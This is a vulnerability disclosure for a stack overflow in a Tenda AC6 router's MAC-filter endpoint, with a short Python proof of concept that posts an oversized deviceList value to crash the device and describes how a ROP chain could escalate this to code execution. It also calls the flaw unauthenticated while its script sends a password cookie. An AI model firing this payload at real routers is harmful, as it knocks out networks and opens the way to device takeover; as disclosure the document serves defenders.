# CVE Submission: Stack-Based Buffer Overflow in Tenda AC6V1.0(firmware V15.03.05.19) setMacFilterCfg

## Summary
A stack-based buffer overflow vulnerability in the Tenda AC6V1.0 router (firmware V15.03.05.19) allows unauthenticated remote attackers to execute arbitrary code or cause denial of service (DoS) via the `deviceList` parameter in the `/goform/setMacFilterCfg` endpoint. The flaw resides in the `sub_BE73C` function (aliased as `parse_macfilter_rule`), which uses unsafe `strcpy` operations without bounds checking, enabling stack corruption.

## Details
- **Vendor**: Tenda
- **Product**: Tenda AC6V1.0 
- **Firmware Version**: V15.03.05.19
- **Firmware Download**: [https://tenda.com.cn/material/show/2681](https://tenda.com.cn/material/show/2681)
- **Component**: `/goform/setMacFilterCfg` (functions `formSetMacFilterCfg` and `sub_BE73C`)
- **Vulnerability Type**: Stack-Based Buffer Overflow (CWE-121)
- **CVE ID**: Pending
- **Reported by**: n0ps1ed (n0ps1edzz@gmail.com)

## Description
The vulnerability exists in the `formSetMacFilterCfg` function, which processes HTTP POST requests to `/goform/setMacFilterCfg`. The `deviceList` parameter is passed to `sub_BD758` and then to `sub_BE73C` (parse_macfilter_rule), where it is split at a carriage return (`\r`, ASCII 13). The portion after `\r` is copied into a fixed-size buffer using `strcpy(a2, src)` without length validation. If the input exceeds the buffer size (likely 64 bytes, based on typical Tenda firmware structs), it overflows the stack, potentially overwriting return addresses or other critical data.

This allows attackers to:
- Cause a denial of service (DoS) by crashing the router.
- Achieve remote code execution (RCE) by crafting a payload with ROP gadgets to call functions like `system("/bin/sh")`, as demonstrated in similar CVEs.



## PoC: Python Exploit Script
```python
from pwn import *
import requests

payload = cyclic(1000)  # 1000-byte cyclic pattern to overflow buffer
url = "http://192.168.100.72/goform/setMacFilterCfg"
cookie = {"Cookie": "password=rfl1qw"}
data = {"macFilterType": "black", "deviceList": b"\r" + payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)  # Double POST to bypass potential checks
print(response.text)
```


## Impact
- **Denial of Service (DoS)**: The oversized payload crashes the router’s web server, disrupting network connectivity and management access.
- **Remote Code Execution (RCE)**: With a crafted ROP chain, attackers can execute arbitrary commands, leading to:
  - Full device compromise (e.g., shell access).
  - Network traffic interception or manipulation (e.g., DNS hijacking).
  - Installation of persistent backdoors or malware.
  - Botnet recruitment.

